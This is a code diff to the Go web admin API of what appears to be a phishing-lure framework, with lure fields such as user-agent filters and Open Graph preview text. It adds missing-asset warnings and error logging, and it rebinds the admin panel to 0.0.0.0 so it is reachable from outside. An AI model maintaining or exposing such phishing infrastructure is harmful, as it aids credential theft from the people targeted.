@@ -128,8 +128,30 @@ func (w *WebAPI) Start(port int) {
 	// Index (root)
 	mux.HandleFunc("/", w.handleIndex)
 
-	log.Info("Starting Web Admin API at http://127.0.0.1:%d", port)
-	go http.ListenAndServe(fmt.Sprintf("127.0.0.1:%d", port), securityHeaders(mux))
+	// ------------------------------------------------------------------
+	// FIX 1+3: If the web/ UI assets are missing, say so clearly instead
+	// of letting every page request 404 mysteriously.
+	// ------------------------------------------------------------------
+	if _, err := os.Stat("web/index.html"); err != nil {
+		wd, _ := os.Getwd()
+		log.Warning("webapi: 'web/index.html' not found (looked in '%s') — the web admin pages will not load until the web/ folder exists there", wd)
+	} else if _, err := os.Stat("web/login.html"); err != nil {
+		wd, _ := os.Getwd()
+		log.Warning("webapi: 'web/login.html' not found (looked in '%s') — the login page will not load", wd)
+	}
+
+	// ------------------------------------------------------------------
+	// FIX 2 (was your item (c)): bind to 0.0.0.0 instead of 127.0.0.1,
+	// so the panel is reachable from outside the container/host.
+	// ------------------------------------------------------------------
+	log.Info("Starting Web Admin API at http://0.0.0.0:%d (login: use the admin password printed above, then change it)", port)
+	go func() {
+		if err := http.ListenAndServe(fmt.Sprintf("0.0.0.0:%d", port), securityHeaders(mux)); err != nil {
+			// FIX 3: previously the listener error was silently discarded —
+			// now a busy port is reported instead of failing invisibly.
+			log.Error("webapi: server error: %v", err)
+		}
+	}()
 }
 
 // securityHeaders adds defensive HTTP headers to every response.
@@ -378,15 +400,15 @@ func (w *WebAPI) handleStats(rw http.ResponseWriter, req *http.Request) {
 	}
 
 	stats := map[string]interface{}{
-		"total":          total,
-		"validCount":     validCount,
-		"invalidCount":   invalidCount,
-		"visitPercent":   100,
-		"visitTrend":     "bull",
-		"validPercent":   validPct,
-		"validTrend":     validTrend,
+		"total":         total,
+		"validCount":    validCount,
+		"invalidCount":  invalidCount,
+		"visitPercent":  100,
+		"visitTrend":    "bull",
+		"validPercent":  validPct,
+		"validTrend":    validTrend,
 		"invalidPercent": invalidPct,
-		"invalidTrend":   invalidTrend,
+		"invalidTrend":  invalidTrend,
 	}
 	rw.Header().Set("Content-Type", "application/json")
 	json.NewEncoder(rw).Encode(stats)
@@ -957,7 +979,7 @@ func (w *WebAPI) handleLures(rw http.ResponseWriter, req *http.Request) {
 				"ua_filter":       l.UserAgentFilter,
 				"info":            l.Info,
 				"og_title":        l.OgTitle,
-				"og_desc":         l.OgDescription,
+				"og_desc":          l.OgDescription,
 				"og_image":        l.OgImageUrl,
 				"og_url":          l.OgUrl,
 				"paused_until":    l.PausedUntil,
